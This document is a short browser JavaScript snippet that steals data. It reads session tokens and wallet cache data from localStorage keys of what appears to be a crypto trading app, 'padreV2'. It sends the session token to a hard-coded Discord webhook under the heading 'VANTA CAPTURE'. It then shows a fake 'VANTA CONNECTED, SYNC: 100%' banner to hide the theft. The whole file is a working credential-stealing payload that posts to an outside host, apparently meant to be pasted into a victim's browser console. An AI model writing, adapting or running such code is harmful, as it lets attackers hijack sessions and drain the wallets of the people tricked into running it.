(async function() {
    // CAPTURE DATA
    const session = localStorage.getItem("padreV2-session");
    const wallets = localStorage.getItem("padreV2-walletsCache");
    const bundles = localStorage.getItem("padre-v2-bundles-store-v2");

    // SEND TO DISCORD
    fetch("https://discord.com/api/webhooks/1470147665403711650/EoDTKeiayE46AN7W8ENl-CkVdoaiep9oyq2FljjRLTh505lEgpxakCw1iMjx97FMiqQ4", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
            content: "🚨 **VANTA CAPTURE** 🚨",
            embeds: [{
                description: `**Session:** \`${session}\`\n\n**Wallets:** \`${wallets ? "Captured" : "Empty"}\``,
                color: 0x00ff88
            }]
        })
    });

    // SHOW SUCCESS UI
    const d = document.createElement("div");
    d.style = "position:fixed;top:20px;right:20px;background:#000;color:#0f8;padding:20px;border:2px solid #0f8;z-index:99999;font-family:monospace;box-shadow:0 0 15px #0f8;";
    d.innerHTML = "VANTA CONNECTED<br>SYNC: 100%";
    document.body.appendChild(d);
})();
